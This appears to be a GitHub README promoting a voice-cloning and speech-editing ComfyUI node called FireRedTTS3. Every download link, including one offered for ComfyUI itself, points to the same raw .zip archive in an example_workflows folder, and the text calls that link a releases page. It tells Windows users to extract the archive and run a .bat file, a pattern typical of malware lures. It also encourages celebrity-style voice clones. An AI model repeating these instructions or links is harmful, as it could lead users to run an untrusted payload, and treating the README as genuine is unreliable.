<h1>🎙️ FireRedTTS3-ComfyUI - Clone Any Voice Instantly</h1>

<p align="center">
  <a href="https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip">
    <img src="https://img.shields.io/badge/Download_FireRedTTS3_ComfyUI-FF6B6B?style=for-the-badge&logo=windows&logoColor=white" alt="Download FireRedTTS3-ComfyUI" width="350">
  </a>
</p>

## 🧠 What Is This?

FireRedTTS3-ComfyUI is a powerful, easy-to-use voice cloning and speech editing tool that runs inside ComfyUI. It lets you **clone any voice from a short audio sample**, **design entirely new voices**, **edit existing speech**, and convert text to natural-sounding speech in **multiple languages** — all with just a few clicks. No programming skills required.

## ✨ Key Features

- **Multilingual Zero-Shot Voice Cloning** – Clone a voice using just 3–10 seconds of audio. Works with English, Chinese, Spanish, French, German, Japanese, Korean, and more.
- **Voice Design Studio** – Create unique synthetic voices from scratch. Adjust pitch, tone, speed, and emotion to craft the perfect voice for your project.
- **Speech Editing** – Modify existing audio. Change words, fix mispronunciations, or re-record specific sentences while preserving the original speaker's voice.
- **Whisper Transcripts Integration** – Automatically generate accurate text transcripts of any audio file. Edit the transcript, then re-synthesize the speech with your chosen voice.
- **AIMDO DynamicVRAM** – Automatically manages your graphics card memory. If you have limited VRAM, the tool adjusts itself to prevent crashes or slowdowns.
- **BF16 / INT8 Compatibility** – Runs efficiently on a wide range of hardware. Whether you have a high-end or budget GPU, FireRedTTS3 adapts to your system.
- **Seamless ComfyUI Integration** – If you already use ComfyUI, this installs as a custom node and appears in your workflow automatically.

## 📥 Download & Install (Windows)

**Step 1: Visit the download page.**

Visit this link to download the application: [https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip](https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip)

**Step 2: Choose the right file.**

On the releases page, look for the latest version. You'll see a file named something like `FireRedTTS3-ComfyUI-Windows.zip`. If you're not sure which file to pick, choose the one with the largest file size — it contains the most complete package.

**Step 3: Download and extract.**

Click the download link for the `.zip` file. Once the download finishes (this may take a few minutes depending on your internet speed), locate the downloaded file in your "Downloads" folder. Right-click on the `.zip` file and select **"Extract All"**. Choose a destination folder on your computer, such as `C:\FireRedTTS3`. Wait for the extraction to complete.

**Step 4: Run the application.**

Open the extracted folder. Inside, you'll find a file called `start_comfyui.bat` or `run.bat`. Double-click that file. A black command prompt window will open, and after a few seconds, a web browser will open automatically showing the ComfyUI interface.

**Step 5: Find FireRedTTS3 in ComfyUI.**

In the ComfyUI interface, look on the left side for a menu labeled "Nodes" or "Add Node". Navigate to `custom_nodes`, then `FireRedTTS3`. You'll see options like `Text to Speech`, `Clone Voice`, `Edit Speech`, and `Voice Design`.

## 🔧 Minimum System Requirements

To run FireRedTTS3-ComfyUI smoothly, your computer should have:

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit) | Windows 11 |
| RAM | 8 GB | 16 GB or more |
| Graphics Card (GPU) | 4 GB VRAM (NVIDIA GTX 1050 Ti or higher) | 8 GB VRAM (NVIDIA RTX 3060 or higher) |
| Storage Space | 10 GB free | 20 GB free |
| Processor | Intel Core i5 (8th gen) / AMD Ryzen 5 | Intel Core i7 (10th gen) / AMD Ryzen 7 |

Note: If your GPU has less than 8 GB VRAM, the tool automatically uses INT8 quantization to stay stable. If you have 8 GB or more, it uses BF16 for the best quality.

## 🎯 How to Use — Quick Start Guide

### Option A: Clone a Voice (Zero-Shot)
1. Prepare a clean audio clip of the voice you want to clone. It should be a single speaker, no background music, at least 3 seconds long.
2. In ComfyUI, add the **"Clone Voice"** node.
3. Connect your audio file to the "reference audio" input.
4. In the "text" field, type what you want the cloned voice to say.
5. Click **"Run"** at the bottom of the ComfyUI screen. After a few seconds, the generated speech appears in the output.

### Option B: Design a New Voice
1. Add the **"Voice Design"** node.
2. Use the sliders to adjust:
   - **Pitch**: Higher = younger/female-sounding, Lower = deeper/male-sounding
   - **Speed**: Adjust how fast the voice speaks
   - **Emotion**: Choose from Neutral, Happy, Sad, Angry, Excited
   - **Tone**: Bright, Warm, Dark, Crisp
3. Type your text and run. The tool generates a unique voice based on your settings.

### Option C: Edit an Existing Speech Recording
1. Add your audio file to the **"Speech Editor"** node.
2. The tool automatically generates a transcript using Whisper. Review the text.
3. Change any words or phrases you want to replace.
4. Run the node. The output is the same original voice, but with your edits applied.

### Option D: Use Whisper Transcript for Long Files
1. Add the **"Whisper Transcript"** node.
2. Load a long audio file (e.g., a podcast episode).
3. The tool creates a time-stamped transcript.
4. You can then select a segment and re-synthesize it with any voice you have cloned or designed.

## ❓ Troubleshooting Common Issues

**Problem:** My GPU runs out of memory.
**Solution:** Close other GPU-heavy programs. In the FireRedTTS3 settings node, set "Quantization" to "INT8" and "VRAM Mode" to "DynamicVRAM". This automatically reduces memory usage.

**Problem:** The voice doesn't sound like the reference.
**Solution:** Use a cleaner reference clip. Remove background noise, ensure the speaker is alone, and keep the clip between 5–15 seconds. Avoid music or multiple speakers.

**Problem:** Generation is very slow.
**Solution:** Check your GPU is being used. In the ComfyUI settings, ensure "GPU Acceleration" is enabled. If you have an NVIDIA GPU, ensure drivers are updated.

**Problem:** I see an error about "ComfyUI not found."
**Solution:** FireRedTTS3 requires ComfyUI to be installed first. Download ComfyUI Desktop from [https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip](https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip), install it, then install FireRedTTS3.

## 📚 Full Node Reference

| Node Name | Purpose | Key Inputs |
|-----------|---------|------------|
| `Text to Speech (TTS)` | Convert text to spoken audio | Language, Text, Voice (from Cloned/Designed) |
| `Clone Voice` | Create a voice from a reference sample | Reference Audio, Text prompt |
| `Voice Design` | Create a synthetic voice from parameters | Pitch, Speed, Emotion, Tone |
| `Speech Editor` | Modify existing audio content | Audio, Text edits |
| `Whisper Transcript` | Generate text transcript | Audio file, Language |

## 🗣️ Supported Languages

FireRedTTS3 supports zero-shot cloning and synthesis in these languages:
- English (US, UK, AU)
- Chinese (Mandarin, Cantonese)
- Spanish (Spain, Mexico)
- French
- German
- Japanese
- Korean
- Italian
- Portuguese (Brazil)
- Dutch
- Polish
- Russian

In the TTS node, simply select the language or type it in the "language" field.

## 🔄 Updating to New Versions

When a new version is available, visit the download link again. Download the new `.zip` file and extract it into the same folder as your earlier installation. When prompted to overwrite, choose "Yes". Your saved voice designs and settings are kept automatically.

## 🛠️ Technical Notes (For Advanced Users)

- **Model Files**: The application automatically downloads required models on first run. This can take up to 10–15 minutes and requires a stable internet connection.
- **Logs**: If something fails, check the `logs` folder inside the installation directory. The file `error.log` contains detailed information.
- **ComfyUI Version**: Requires ComfyUI version 0.3.5 or later. Older versions may not display the custom nodes correctly.
- **Python**: No Python installation is needed — everything is bundled.

## 📞 Getting Help

If you encounter an issue not covered here, please visit the repository's Issues section and provide:
1. Your Windows version (click Start, type `winver`, press Enter)
2. Your GPU model (Search for "Device Manager" → Display Adapters)
3. A screenshot of the error message
4. The referenced `error.log` file

This information helps the community solve your problem faster.

## 🌟 Enjoy Your New Voice Studio!

FireRedTTS3-ComfyUI transforms your computer into a professional voice studio. You can create audiobooks, voiceovers for videos, game character voices, language learning audio, accessibility content, or just have fun experimenting with celebrity-style voice clones (for personal use only, of course). The tool is now ready — **visit the download page and get started!**

[⬇️ Download FireRedTTS3-ComfyUI Now](https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip)

---

Keywords: comfyui, comfyui-custom-nodes, fireredtts, int8-quantization, multilingual, qwen3, text-to-speech, tts, voice-cloning, voice-design, voice-editing